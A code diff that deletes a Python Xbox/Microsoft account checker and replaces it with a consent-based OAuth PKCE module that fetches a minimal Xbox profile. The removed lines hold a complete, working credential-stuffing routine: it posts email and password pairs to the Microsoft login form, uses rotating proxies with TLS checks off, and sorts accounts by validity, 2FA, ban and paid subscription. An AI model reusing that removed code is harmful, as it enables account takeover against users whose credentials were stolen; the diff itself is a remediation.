@@ -1,430 +1,307 @@
-import asyncio
-import re
-import time
-import json
-import random
-from threading import Lock
-from urllib.parse import urlparse, parse_qs, unquote
-import requests
-import urllib3
+"""Consent-based Microsoft/Xbox account connection.
 
-urllib3.disable_warnings()
+This module intentionally uses Microsoft's OAuth 2.0 authorization-code flow
+with PKCE. It never accepts Microsoft passwords, rotates proxies, disables TLS
+verification, or automates the Microsoft sign-in form.
 
-# ===================== ABONELİK TÜRLERİ =====================
-SUB_TYPES = [
-    'xbox game pass ultimate',
-    'xbox game pass core',
-    'pc game pass',
-    'game pass console',
-    'xbox live gold',
-    'ea play',
-    'microsoft 365',
-    'office 365',
-    'onedrive',
-    'copilot pro',
-    'game pass'
-]
+A normal Entra application can retrieve the consenting user's Xbox profile.
+Game Pass subscription entitlement APIs are partner services and require a
+Microsoft Partner Center relationship/authorization; this project therefore
+never invents subscription data when that capability is unavailable.
 
-# ===================== PROXY MANAGER =====================
-class ProxyManager:
-    def __init__(self, proxy_list=None):
-        self.proxies = proxy_list or []
-        self._lock = Lock()
-        self.bad_proxies = set()
-        self.fail_count = {}
+Official references:
+- https://learn.microsoft.com/entra/identity-platform/v2-oauth2-auth-code-flow
+- https://learn.microsoft.com/gaming/gdk/docs/services/fundamentals/s2s-auth-calls/service-authentication/live-website-authentication
+- https://learn.microsoft.com/gaming/gdk/docs/store/commerce/service-to-service/xstore-detecting-game-pass
+"""
 
-    def has_proxies(self):
-        return bool(self.proxies)
+from __future__ import annotations
 
-    def get(self):
-        if not self.proxies:
-            return None
-        with self._lock:
-            self.proxies = [p for p in self.proxies if p not in self.bad_proxies]
-            if not self.proxies:
-                return None
-            p = random.choice(self.proxies)
-        parts = p.split(':')
-        if len(parts) >= 4:
-            s = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-        elif len(parts) == 2:
-            s = f"http://{parts[0]}:{parts[1]}"
-        else:
-            s = f"http://{p}"
-        return {"http": s, "https": s}
-    
-    def mark_bad(self, proxy_str):
-        with self._lock:
-            self.bad_proxies.add(proxy_str)
+import base64
+import hashlib
+import os
+import secrets
+from dataclasses import dataclass
+from typing import Any
+from urllib.parse import urlencode
 
-# ===================== XBOX CHECKER =====================
-class XboxChecker:
-    LOGIN_URL = (
-        "https://login.live.com/oauth20_authorize.srf"
-        "?client_id=00000000402B5328"
-        "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
-        "&scope=service::user.auth.xboxlive.com::MBI_SSL"
-        "&display=touch&response_type=token&locale=en"
-    )
+import httpx
 
-    def __init__(self, proxy_manager=None):
-        self.proxy_manager = proxy_manager
+AUTHORIZE_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
+TOKEN_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
+XBOX_USER_AUTH_URL = "https://user.auth.xboxlive.com/user/authenticate"
+XSTS_URL = "https://xsts.auth.xboxlive.com/xsts/authorize"
+XBOX_PROFILE_URL = (
+    "https://profile.xboxlive.com/users/me/profile/settings"
+    "?settings=Gamertag,Gamerscore,AccountTier"
+)
+# Immediate profile retrieval needs sign-in scope only. Offline access would
+# mint a refresh token that this privacy-minimizing implementation never uses.
+OAUTH_SCOPES = "XboxLive.signin"
+UPSTREAM_TIMEOUT_SECONDS = 20.0
 
-    def _session(self):
-        s = requests.Session()
-        s.verify = False
-        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
-        if self.proxy_manager:
-            proxy = self.proxy_manager.get()
-            if proxy:
-                s.proxies.update(proxy)
-        return s
 
-    def _extract_token(self, url):
-        fragment = urlparse(url).fragment
-        if not fragment and '#' in url:
-            fragment = url.split('#', 1)[1]
-        params = parse_qs(fragment)
-        return params.get('access_token', [None])[0]
+class XboxIntegrationError(RuntimeError):
+    """Safe, user-facing integration failure (never contains a token)."""
 
-    def _detect_subscription(self, text):
-        if not text:
-            return None
-        text_lower = text.lower()
-        for sub in SUB_TYPES:
-            if sub in text_lower:
-                return sub.upper()
-        return None
 
-    def check(self, email, password):
-        start_time = time.time()
-        try:
-            session = self._session()
-            
-            # === ADIM 1: LOGIN ===
-            r1 = session.get(self.LOGIN_URL, timeout=(10, 15))
-            sftag_m = re.search(r'value=\\"(.+?)\\"', r1.text)
-            url_post_m = re.search(r'"urlPost":"(.+?)"', r1.text)
-            
-            if not sftag_m or not url_post_m:
-                return {"status": "ERROR", "duration": time.time() - start_time,
-                        "error": "Could not parse the Microsoft login page (layout changed or blocked)"}
-            
-            sftag = sftag_m.group(1)
-            url_post = url_post_m.group(1)
+@dataclass(frozen=True)
+class PkcePair:
+    verifier: str
+    challenge: str
 
-            r2 = session.post(
-                url_post,
-                data={
-                    'login': email,
-                    'loginfmt': email,
-                    'passwd': password,
-                    'PPFT': sftag,
-                    'type': '11',
-                    'LoginOptions': '1'
-                },
-                timeout=(10, 15),
-                allow_redirects=True
+
+def has_client_id() -> bool:
+    return bool(os.environ.get("MICROSOFT_CLIENT_ID", "").strip())
+
+
+def has_client_secret() -> bool:
+    return bool(os.environ.get("MICROSOFT_CLIENT_SECRET", "").strip())
+
+
+def is_configured() -> bool:
+    """Whether the confidential Entra Web application is fully configured."""
+    return has_client_id() and has_client_secret()
+
+
+def configuration() -> dict[str, Any]:
+    """Return non-secret capability information for the dashboard."""
+    return {
+        "oauth_configured": is_configured(),
+        "oauth_provider": "Microsoft identity platform",
+        "oauth_flow": "authorization_code_pkce",
+        "profile_access": is_configured(),
+        "game_pass_entitlement_access": False,
+        "game_pass_requirement": (
+            "Microsoft Partner Center publisher authorization is required for "
+            "Game Pass entitlement queries. No demo result is substituted."
+        ),
+        "manage_subscriptions_url": "https://account.microsoft.com/services",
+    }
+
+
+def create_pkce_pair() -> PkcePair:
+    verifier = secrets.token_urlsafe(64)
+    digest = hashlib.sha256(verifier.encode("ascii")).digest()
+    challenge = base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")
+    return PkcePair(verifier=verifier, challenge=challenge)
+
+
+def create_state() -> str:
+    return secrets.token_urlsafe(48)
+
+
+def hash_state(state: str) -> str:
+    return hashlib.sha256(str(state or "").encode("utf-8")).hexdigest()
+
+
+def authorization_url(*, state: str, challenge: str, redirect_uri: str) -> str:
+    client_id = os.environ.get("MICROSOFT_CLIENT_ID", "").strip()
+    if not client_id:
+        raise XboxIntegrationError("Microsoft OAuth is not configured")
+    params = {
+        "client_id": client_id,
+        "response_type": "code",
+        "redirect_uri": redirect_uri,
+        "response_mode": "query",
+        "scope": OAUTH_SCOPES,
+        "state": state,
+        "code_challenge": challenge,
+        "code_challenge_method": "S256",
+        "prompt": "select_account",
+    }
+    return f"{AUTHORIZE_URL}?{urlencode(params)}"
+
+
+def _safe_json(response: httpx.Response) -> dict[str, Any]:
+    try:
+        payload = response.json()
+    except Exception as exc:
+        raise XboxIntegrationError("Microsoft returned an unreadable response") from exc
+    if not isinstance(payload, dict):
+        raise XboxIntegrationError("Microsoft returned an unexpected response")
+    return payload
+
+
+async def exchange_authorization_code(
+    *, code: str, verifier: str, redirect_uri: str
+) -> str:
+    """Exchange one authorization code for an Xbox-scoped Microsoft token."""
+    client_id = os.environ.get("MICROSOFT_CLIENT_ID", "").strip()
+    client_secret = os.environ.get("MICROSOFT_CLIENT_SECRET", "").strip()
+    if not client_id or not client_secret:
+        raise XboxIntegrationError("Microsoft OAuth is not configured")
+
+    form = {
+        "client_id": client_id,
+        "code": code,
+        "redirect_uri": redirect_uri,
+        "grant_type": "authorization_code",
+        "scope": OAUTH_SCOPES,
+        "code_verifier": verifier,
+    }
+    form["client_secret"] = client_secret
+
+    try:
+        async with httpx.AsyncClient(
+            timeout=UPSTREAM_TIMEOUT_SECONDS,
+            follow_redirects=False,
+        ) as client:
+            response = await client.post(
+                TOKEN_URL,
+                data=form,
+                headers={"Accept": "application/json"},
             )
+    except httpx.TimeoutException as exc:
+        raise XboxIntegrationError("Microsoft sign-in timed out; please try again") from exc
+    except httpx.HTTPError as exc:
+        raise XboxIntegrationError("Microsoft sign-in is temporarily unavailable") from exc
 
-            ms_token = None
+    payload = _safe_json(response)
+    access_token = payload.get("access_token")
+    if response.status_code != 200 or not isinstance(access_token, str) or len(access_token) < 20:
+        error = str(payload.get("error", "authorization_failed"))
+        if error == "invalid_grant":
+            raise XboxIntegrationError("The sign-in approval expired or was already used")
+        raise XboxIntegrationError("Microsoft did not approve the requested Xbox access")
+    return access_token
 
-            # === ADIM 2: TOKEN KONTROLÜ ===
-            if 'access_token' in r2.url:
-                ms_token = self._extract_token(r2.url)
-            else:
-                r2_lower = r2.text.lower()
-                
-                if ('incorrect' in r2_lower or 'invalid' in r2_lower or 
-                    "doesn't exist" in r2_lower or 'account doesn' in r2_lower or
-                    re.search(r'sErrorCode.*?"50126"', r2.text)):
-                    return {"status": "BAD", "duration": time.time() - start_time}
 
-                if ('identity/confirm' in r2.url or 'two-step' in r2_lower or 
-                    'verify your identity' in r2_lower):
-                    return {"status": "2FA", "duration": time.time() - start_time}
+_XSTS_ERRORS = {
+    2148916229: "This Xbox account is currently restricted",
+    2148916233: "This Microsoft account does not have an Xbox profile yet",
+    2148916235: "Xbox services are not available in this account region",
+    2148916236: "This account needs adult verification before using Xbox services",
+    2148916237: "This account needs adult verification before using Xbox services",
+    2148916238: "A family organizer must add this child account to an Xbox family",
+}
 
-                if '/Abuse' in r2.url or 'suspended' in r2_lower:
-                    return {"status": "BANNED", "duration": time.time() - start_time}
 
-                form_action_m = re.search(r'<form[^>]*action="([^"]+)"', r2.text)
-                if form_action_m:
-                    action = form_action_m.group(1)
-                    hidden = {}
-                    for m in re.finditer(r'<input[^>]+>', r2.text, re.I):
-                        inp = m.group()
-                        if 'hidden' in inp.lower():
-                            n = re.search(r'name="([^"]+)"', inp)
-                            v = re.search(r'value="([^"]*)"', inp)
-                            if n:
-                                hidden[n.group(1)] = v.group(1) if v else ''
-                    
-                    r3 = session.post(action, data=hidden, timeout=(10, 15), allow_redirects=True)
-                    if 'access_token' in r3.url:
-                        ms_token = self._extract_token(r3.url)
-                    else:
-                        ru_m = re.search(r'ru=([^&"\'>\s]+)', action)
-                        if not ru_m:
-                            ru_m = re.search(r'ru=([^&"\'>\s]+)', r3.url)
-                        if ru_m:
-                            ru = unquote(ru_m.group(1))
-                            r4 = session.get(ru, timeout=(10, 15), allow_redirects=True)
-                            if 'access_token' in r4.url:
-                                ms_token = self._extract_token(r4.url)
+async def fetch_xbox_profile(access_token: str) -> dict[str, Any]:
+    """Exchange a consented Microsoft token and return a minimal Xbox profile.
 
-                if not ms_token:
-                    return {"status": "BAD", "duration": time.time() - start_time}
+    Tokens are held only in local variables for this request and are never
+    returned, logged, or persisted by this function.
+    """
+    if not access_token or len(access_token) < 20:
+        raise XboxIntegrationError("Microsoft access token is missing")
 
-            if not ms_token:
-                return {"status": "BAD", "duration": time.time() - start_time}
-
-            # === ADIM 3: XBOX AUTH ===
-            r_xbl = session.post(
-                'https://user.auth.xboxlive.com/user/authenticate',
+    try:
+        async with httpx.AsyncClient(
+            timeout=UPSTREAM_TIMEOUT_SECONDS,
+            follow_redirects=False,
+        ) as client:
+            user_response = await client.post(
+                XBOX_USER_AUTH_URL,
+                headers={
+                    "Accept": "application/json",
+                    "Content-Type": "application/json",
+                    "x-xbl-contract-version": "1",
+                },
                 json={
                     "Properties": {
                         "AuthMethod": "RPS",
                         "SiteName": "user.auth.xboxlive.com",
-                        "RpsTicket": ms_token
+                        "RpsTicket": f"d={access_token}",
                     },
                     "RelyingParty": "http://auth.xboxlive.com",
-                    "TokenType": "JWT"
+                    "TokenType": "JWT",
                 },
-                timeout=(10, 15)
             )
-            
-            if r_xbl.status_code != 200:
-                return {"status": "FREE", "data": {}, "duration": time.time() - start_time}
-            
-            xbl_data = r_xbl.json()
-            xbl_token = xbl_data['Token']
-            uhs = xbl_data['DisplayClaims']['xui'][0]['uhs']
+            user_payload = _safe_json(user_response)
+            user_token = user_payload.get("Token")
+            claims = user_payload.get("DisplayClaims", {}).get("xui", [])
+            user_hash = claims[0].get("uhs") if claims and isinstance(claims[0], dict) else None
+            if (
+                user_response.status_code != 200
+                or not isinstance(user_token, str)
+                or not isinstance(user_hash, str)
+                or not user_token
+                or not user_hash
+            ):
+                raise XboxIntegrationError("Xbox could not create a user token for this account")
 
-            # === ADIM 4: XSTS AUTH ===
-            r_xsts = session.post(
-                'https://xsts.auth.xboxlive.com/xsts/authorize',
+            xsts_response = await client.post(
+                XSTS_URL,
+                headers={
+                    "Accept": "application/json",
+                    "Content-Type": "application/json",
+                    "x-xbl-contract-version": "1",
+                },
                 json={
-                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
+                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},
                     "RelyingParty": "http://xboxlive.com",
-                    "TokenType": "JWT"
+                    "TokenType": "JWT",
                 },
-                timeout=(10, 15)
             )
-            
-            gamertag = ""
-            gamerscore = 0
-            gamepass_type = None
-            subscription_details = []
-            
-            if r_xsts.status_code == 401:
-                xerr = r_xsts.json().get('XErr', 0) if r_xsts.text.startswith('{') else 0
-                if xerr == 2148916229:
-                    return {"status": "BANNED", "duration": time.time() - start_time}
-            
-            if r_xsts.status_code == 200:
-                xsts_token = r_xsts.json()['Token']
-                xbl_auth = f"XBL3.0 x={uhs};{xsts_token}"
-                
-                # === PROFİL ===
-                r_prof = session.get(
-                    "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
-                    headers={
-                        "Authorization": xbl_auth,
-                        "x-xbl-contract-version": "2",
-                        "Accept": "application/json"
-                    },
-                    timeout=(10, 15)
-                )
-                if r_prof.status_code == 200:
-                    settings = r_prof.json().get('profileUsers', [{}])[0].get('settings', [])
-                    for s in settings:
-                        if s.get('id') == 'Gamertag':
-                            gamertag = s.get('value', '')
-                        elif s.get('id') == 'Gamerscore':
-                            try:
-                                gamerscore = int(s.get('value', 0))
-                            except:
-                                pass
-
-                # === KONTROL 1: Xbox Subscriptions ===
+            xsts_payload = _safe_json(xsts_response)
+            if xsts_response.status_code != 200:
                 try:
-                    sub_url = "https://subscriptions.xboxlive.com/users/me/subscriptions"
-                    sub_headers = {
-                        'Authorization': xbl_auth,
-                        'Accept': 'application/json',
-                        'x-xbl-contract-version': '2'
-                    }
-                    r_sub = session.get(sub_url, headers=sub_headers, timeout=(10, 15))
-                    if r_sub.status_code == 200:
-                        sub_data = r_sub.json()
-                        for sub in sub_data.get('subscriptions', []):
-                            name = sub.get('name', '')
-                            state = sub.get('state', '')
-                            sub_type = self._detect_subscription(name)
-                            if sub_type:
-                                subscription_details.append(f"{sub_type}")
-                                if state.lower() == 'active':
-                                    gamepass_type = sub_type
-                                    break
-                except:
-                    pass
+                    code = int(xsts_payload.get("XErr", 0))
+                except (TypeError, ValueError):
+                    code = 0
+                raise XboxIntegrationError(
+                    _XSTS_ERRORS.get(code, "Xbox did not authorize profile access")
+                )
 
-                # === KONTROL 2: Xbox Store ===
-                if not gamepass_type:
-                    try:
-                        store_url = "https://storeedgefd.dsx.mp.microsoft.com/v9.0/users/me/purchases"
-                        store_headers = {
-                            'Authorization': xbl_auth,
-                            'Accept': 'application/json'
-                        }
-                        r_store = session.get(store_url, headers=store_headers, timeout=(10, 15))
-                        if r_store.status_code == 200:
-                            store_data = r_store.json()
-                            for item in store_data.get('items', []):
-                                name = item.get('name', '')
-                                sub_type = self._detect_subscription(name)
-                                if sub_type:
-                                    subscription_details.append(f"{sub_type}")
-                                    gamepass_type = sub_type
-                                    break
-                    except:
-                        pass
+            xsts_token = xsts_payload.get("Token")
+            xui = xsts_payload.get("DisplayClaims", {}).get("xui", [])
+            xui_claim = xui[0] if xui and isinstance(xui[0], dict) else {}
+            # The XSTS response is authoritative for the user hash paired with
+            # its token. It normally equals the User Token claim, but using the
+            # matching XSTS claim avoids constructing a mismatched XBL3.0 pair.
+            xsts_user_hash = xui_claim.get("uhs") or user_hash
+            if (
+                not isinstance(xsts_token, str)
+                or not isinstance(xsts_user_hash, str)
+                or not xsts_token
+                or not xsts_user_hash
+            ):
+                raise XboxIntegrationError("Xbox returned an incomplete authorization response")
 
-                # === KONTROL 3: Minecraft API ===
-                if not gamepass_type:
-                    try:
-                        r_mc_xsts = session.post(
-                            'https://xsts.auth.xboxlive.com/xsts/authorize',
-                            json={
-                                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
-                                "RelyingParty": "rp://api.minecraftservices.com/",
-                                "TokenType": "JWT"
-                            },
-                            timeout=(10, 15)
-                        )
-                        if r_mc_xsts.status_code == 200:
-                            mc_xsts_token = r_mc_xsts.json()['Token']
-                            r_mc_auth = session.post(
-                                'https://api.minecraftservices.com/authentication/login_with_xbox',
-                                json={'identityToken': f"XBL3.0 x={uhs};{mc_xsts_token}"},
-                                timeout=(10, 15)
-                            )
-                            if r_mc_auth.status_code == 200:
-                                mc_token = r_mc_auth.json().get('access_token', '')
-                                r_ent = session.get(
-                                    'https://api.minecraftservices.com/entitlements/mcstore',
-                                    headers={'Authorization': f"Bearer {mc_token}"},
-                                    timeout=(10, 15)
-                                )
-                                if r_ent.status_code == 200:
-                                    ent_text = r_ent.text.lower()
-                                    if 'product_game_pass_ultimate' in ent_text:
-                                        gamepass_type = 'GAME PASS ULTIMATE'
-                                    elif 'product_game_pass_pc' in ent_text:
-                                        gamepass_type = 'PC GAME PASS'
-                                    elif 'product_game_pass_extra' in ent_text:
-                                        gamepass_type = 'GAME PASS EXTRA'
-                                    elif 'product_game_pass_premium' in ent_text:
-                                        gamepass_type = 'GAME PASS PREMIUM'
-                                    elif 'product_game_pass_core' in ent_text or 'xbox_live_gold' in ent_text:
-                                        gamepass_type = 'GAME PASS CORE'
-                                    elif 'product_game_pass' in ent_text:
-                                        gamepass_type = 'GAME PASS'
-                    except:
-                        pass
+            profile_response = await client.get(
+                XBOX_PROFILE_URL,
+                headers={
+                    "Authorization": f"XBL3.0 x={xsts_user_hash};{xsts_token}",
+                    "Accept": "application/json",
+                    "x-xbl-contract-version": "2",
+                },
+            )
+            profile_payload = _safe_json(profile_response)
+            if profile_response.status_code != 200:
+                raise XboxIntegrationError("Xbox profile data is temporarily unavailable")
+    except XboxIntegrationError:
+        raise
+    except httpx.TimeoutException as exc:
+        raise XboxIntegrationError("Xbox profile request timed out; please try again") from exc
+    except httpx.HTTPError as exc:
+        raise XboxIntegrationError("Xbox profile service is temporarily unavailable") from exc
 
-                # === KONTROL 4: Microsoft Account ===
-                if not gamepass_type:
-                    try:
-                        acc_url = "https://account.microsoft.com/api/user"
-                        acc_headers = {
-                            'Authorization': xbl_auth,
-                            'Accept': 'application/json'
-                        }
-                        r_acc = session.get(acc_url, headers=acc_headers, timeout=(10, 15))
-                        if r_acc.status_code == 200:
-                            acc_data = r_acc.json()
-                            services = acc_data.get('services', {})
-                            for svc_name, svc_data in services.items():
-                                if 'subscription' in svc_name.lower() or 'pass' in svc_name.lower():
-                                    sub_type = self._detect_subscription(svc_name)
-                                    if sub_type:
-                                        subscription_details.append(f"{sub_type}")
-                                        gamepass_type = sub_type
-                                        break
-                    except:
-                        pass
+    profile_users = profile_payload.get("profileUsers", [])
+    profile_user = profile_users[0] if profile_users and isinstance(profile_users[0], dict) else {}
+    settings = profile_user.get("settings", []) if isinstance(profile_user, dict) else []
+    values = {
+        item.get("id"): item.get("value")
+        for item in settings
+        if isinstance(item, dict) and item.get("id")
+    }
 
-            # === SONUÇ ===
-            data = {
-                "gamertag": gamertag,
-                "gamerscore": gamerscore,
-                "subscriptions": list(set(subscription_details)) if subscription_details else []
-            }
-            
-            if gamepass_type:
-                data['gamepass'] = gamepass_type
-                return {
-                    "status": "PREMIUM",
-                    "data": data,
-                    "duration": time.time() - start_time
-                }
-            else:
-                return {
-                    "status": "FREE",
-                    "data": data,
-                    "duration": time.time() - start_time
-                }
-
-        except requests.exceptions.Timeout:
-            return {"status": "TIMEOUT", "duration": time.time() - start_time,
-                    "error": "Upstream request timed out"}
-        except Exception as e:
-            return {"status": "ERROR", "duration": time.time() - start_time,
-                    "error": f"{type(e).__name__}: {str(e)[:160]}"}
-
-
-# ===================== PUBLIC API =====================
-MAX_PROXIES_PER_REQUEST = 20
-
-
-def check_account(email: str, password: str, proxies=None) -> dict:
-    """Run a single synchronous account check with input validation.
-
-    Returns one of the standard result dicts: ``PREMIUM`` / ``FREE`` /
-    ``BAD`` / ``2FA`` / ``BANNED`` / ``TIMEOUT`` / ``ERROR``.
-    """
-    started = time.time()
-    email = (email or "").strip()
-    password = password or ""
-    if not email or not password:
-        return {"status": "ERROR", "duration": 0, "error": "email and password are required"}
-    if len(email) > 320 or len(password) > 512:
-        return {"status": "ERROR", "duration": 0, "error": "email or password too long"}
-
-    clean_proxies: list[str] = []
-    if proxies:
-        if not isinstance(proxies, (list, tuple)):
-            return {"status": "ERROR", "duration": 0, "error": "proxies must be a list of strings"}
-        seen = set()
-        for proxy in proxies:
-            if not isinstance(proxy, str):
-                continue
-            proxy = proxy.strip()
-            if not proxy or proxy in seen:
-                continue
-            seen.add(proxy)
-            clean_proxies.append(proxy)
-            if len(clean_proxies) >= MAX_PROXIES_PER_REQUEST:
-                break
-
-    proxy_manager = ProxyManager(clean_proxies) if clean_proxies else None
+    gamerscore = 0
     try:
-        return XboxChecker(proxy_manager=proxy_manager).check(email, password)
-    except Exception as exc:  # never let a check raise into the API layer
-        return {"status": "ERROR", "duration": time.time() - started, "error": str(exc)[:200]}
+        gamerscore = max(0, min(int(values.get("Gamerscore", 0) or 0), 2**63 - 1))
+    except (TypeError, ValueError):
+        pass
 
+    gamertag = str(values.get("Gamertag") or xui_claim.get("gtg") or "").strip()
+    xuid = str(profile_user.get("id") or xui_claim.get("xid") or "").strip()
+    if xuid and not xuid.isdigit():
+        xuid = ""
+    if not gamertag:
+        raise XboxIntegrationError("Xbox returned a profile without a gamertag")
 
-async def check_account_async(email: str, password: str, proxies=None) -> dict:
-    """Async wrapper that runs the blocking checker in a worker thread."""
-    return await asyncio.to_thread(check_account, email, password, proxies)
+    return {
+        "gamertag": gamertag[:64],
+        "gamerscore": gamerscore,
+        "xuid": xuid[:32] or None,
+        "account_tier": str(values.get("AccountTier") or "")[:64] or None,
+    }
